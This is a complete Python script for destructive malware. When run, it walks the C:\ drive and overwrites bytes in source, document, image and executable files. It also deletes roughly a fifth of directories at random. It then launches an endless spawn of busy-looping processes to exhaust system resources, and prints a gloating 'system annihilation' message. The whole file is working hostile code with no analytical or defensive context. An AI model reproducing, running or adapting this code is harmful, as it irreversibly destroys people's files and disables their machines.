import os, random, shutil, subprocess, threading

def corrupt_file(file_path):
    with open(file_path, 'rb+') as f:
        content = bytearray(f.read())
        for i in range(0, len(content), 50):
            content[i] = random.randint(0, 255)
        f.seek(0)
        f.write(content)

def resource_hog():
    while True:
        subprocess.Popen(['python', '-c', 'while True: pass'])

def infect_and_destroy(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.c', '.h', '.cpp', '.txt', '.doc', '.pdf', '.jpg', '.png', '.exe')):
                file_path = os.path.join(root, file)
                corrupt_file(file_path)
                
        for dir in dirs:
            if random.random() < 0.2:
                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)

    threading.Thread(target=resource_hog).start()

if __name__ == '__main__':
    target_directory = 'C:\\'
    infect_and_destroy(target_directory)
    print("Chaos reigns supreme! System annihilation in progress!")